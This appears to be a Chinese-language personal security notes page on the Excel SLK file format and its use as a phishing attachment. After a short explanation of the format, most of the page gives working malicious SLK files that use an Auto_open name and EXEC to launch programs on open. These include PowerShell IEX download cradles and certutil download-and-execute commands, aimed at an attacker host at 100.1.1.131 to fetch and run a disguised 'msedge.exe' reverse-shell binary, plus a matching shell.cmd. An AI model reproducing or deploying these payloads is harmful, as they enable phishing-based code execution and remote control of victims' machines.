---
category:
  - 网络安全
  - 网络钓鱼
tags:
  - 钓鱼附件
  - Office
  - SLK
excerpt: SLK 文件大多属于 Microsoft 的 Excel。 SLK 文件是符号链接文件，它是由 Microsoft 开发并主要由 Excel 使用的格式。该文件格式仅使用可显示的 ANSI 字符来存储数据，并允许其他应用程序轻松处理其内容。
---

# SLK

## 概述

> [如何在没有 Excel 的情况下打开 SLK 文件 (filext.com)](https://filext.com/zh/wenjian-kuozhan-ming/SLK)
>
> ---
>
> [安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)](https://www.antiy.com/response/20200701.html)

SLK 文件大多属于 Microsoft 的 Excel。 SLK 文件是符号链接文件，它是由 Microsoft 开发并主要由 Excel 使用的格式。该文件格式仅使用可显示的 ANSI 字符来存储数据，并允许其他应用程序轻松处理其内容。

在2007年XLSX引入之前且XLS文件是私有文件格式的时候，SLK是XLS的开放格式替代品，对于最终用户来说，SLK文件看起来像一个Excel文档。

- 主要用途: SLK文件格式主要用于程序之间（如微软 Excel 和 Lotus 1-2-3）传输数据。由于这些文件仅使用可显示的 ANSI 字符，因此程序和用户都很容易解释它们，并且可以使用简单的文本编辑器（例如记事本）查看或修改。
- 预览与编辑软件: 虽然该格式主要由 Microsoft Excel 使用，但其他程序（例如 OpenOffice、LibreOffice 和 Gnumeric）也支持该文件格式的变体。
- 文件结构：SLK 文件中的数据以纯文本形式存储，并以分号分隔的值进行组织。要在单元格中包含文字分号，可以使用前面的分号对其进行转义，这将导致字符被视为单元格的一部分，而不是文件结构的一部分。

例如:

```mathematica
ID;P
C;X1;Y1;K"Header1"
C;X2;Y1;K"Header2"
C;X1;Y2;K"Data1"
C;X2;Y2;K"Data2"
E
```

- `ID;P` 是文件的标识符和参数
- `C;X1;Y1;K"Header1"` 表示第1列第1行的单元格内容是"Header1"
  - `C` - `Cell` 表示这是一行单元格数据
  - `X1` 表示单元格所在的列, 第 1 列
  - `Y1` 表示单元格所在的行, 第 1 行
  - `K"Header1"`：表示单元格的内容，`K` 是 "Konstant"（常量）的缩写，`"Header1"` 是该单元格的实际内容，即文字 "Header1"
- `C;X2;Y1;K"Header2"` 表示第2列第1行的单元格内容是"Header2"
- `C;X1;Y2;K"Data1"` 表示第1列第2行的单元格内容是"Data1"
- `C;X2;Y2;K"Data2"` 表示第2列第2行的单元格内容是"Data2"
- `E` 表示文件结束

---

## 调起计算器

```mathematica
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("calc.exe")
C;X1;Y102;K0;EHALT()
E
```

- `NN;NAuto_open;ER101C1;KOut Flank;F`
  - **NN**：名称定义行，定义一个名称及其范围
  - **N**：后面的 `Auto_open` 表示名称。此处定义了一个名称 `Auto_open`
  - **ER101C1**：范围定义，表示范围从 `R101C1` 开始，即第101行第1列。前面的 `E` 可能表示扩展的范围定义
  - **KOut Flank**：为名称 `Auto_open` 赋值，值为 `Out Flank`
  - **F**：标志，可能用于特定标识或格式设置
- `C;X1;Y101;K0;EEXEC("calc.exe")`
  - **K0**：表示单元格的内容，这里是数值 `0`
  - **EEXEC("calc.exe")**：执行命令 `EXEC("calc.exe")`，表示在读取和执行此SLK文件时将运行 `calc.exe`，即打开计算器程序
-  `C;X1;Y102;K0;EHALT()`
  - **K0**：表示单元格的内容，这里是数值 `0`。
  - **EHALT()**：执行命令 `HALT()`，表示停止或结束操作。这通常用于结束脚本或宏的执行。

![image-20240708153941228](http://cdn.ayusummer233.top/DailyNotes/202407081539970.png)

---

## 反弹Shell

> [安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)](https://www.antiy.com/response/20200701.html)

`http://100.1.1.131:8000/powershell_curl_reverse_shell.txt`: 

```powershell
curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe;./msedge.exe
```

`slk_reverse_shell.slk`:

```mathematica
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("powershell.exe -nop -c IEX((new-object Net.WebClient).DownloadString('http://100.1.1.131:8000/download/powershell_curl_reverse_shell.txt'))")
C;X1;Y102;K0;EHALT()
E
```

> PS: 无法成功执行此命令, 原因未知
>
> PS: 命令替换成 `powershell.exe -nop -c IEX('calc.exe')` 是可以正常弹出计算器的

---

`shell.cmd`

```cmd
certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete
```

`slk_reverse_shell_shell_cmd_file_win1252.slk`

```mathematica
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("c:/temp/shell.cmd")
C;X1;Y102;K0;EHALT()
E
```

---

`slk_reverse_shell_certutil_win1252.slk`

```mathematica
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("cmd.exe /c certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://100.1.1.131:8000/download/msedge.exe delete")
C;X1;Y102;K0;EHALT()
E
```

![image-20240708190618861](http://cdn.ayusummer233.top/DailyNotes/202407081906201.png)

![image-20240708190649128](http://cdn.ayusummer233.top/DailyNotes/202407081906298.png)

---

## 参考材料

> [SLK 文档钓鱼 - Google Search](https://www.google.com/search?q=SLK+文档钓鱼&sca_esv=93393d72ee4371e2&biw=1912&bih=972&sxsrf=ADLYWIKrEcaS-mRNnan1YdFHckVXFvvNkA%3A1720173801763&ei=6cSHZqSlLqmnuvQPua2uoA4&ved=0ahUKEwjkvZ_j0o-HAxWpk44IHbmWC-Q4FBDh1QMIDw&uact=5&oq=SLK+文档钓鱼&gs_lp=Egxnd3Mtd2l6LXNlcnAiEFNMSyDmlofmoaPpkpPpsbwyCBAhGKABGMMESONEUNg7WMxBcAJ4AJABAJgBwAKgAagQqgEFMi01LjK4AQPIAQD4AQGYAgOgArsCwgIKEAAYgAQYsAMYDZgDAIgGAZAGAZIHBTIuMC4xoAfJDQ&sclient=gws-wiz-serp)

- [Macos Office攻防 | YoungRichOG](https://youngrichog.github.io/2021/06/16/Macos-Office攻防/)
- [关于文档钓鱼的学习 | 藏青's BLOG (cangqingzhe.github.io)](https://cangqingzhe.github.io/2020/09/02/关于文档钓鱼的学习/)
- [【技术分享】如何绕过受保护视图发起钓鱼攻击-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/87013)
- [安天引擎助力全线产品精准检测SLK格式威胁 (antiy.com)](https://www.antiy.com/response/20200701.html)

---

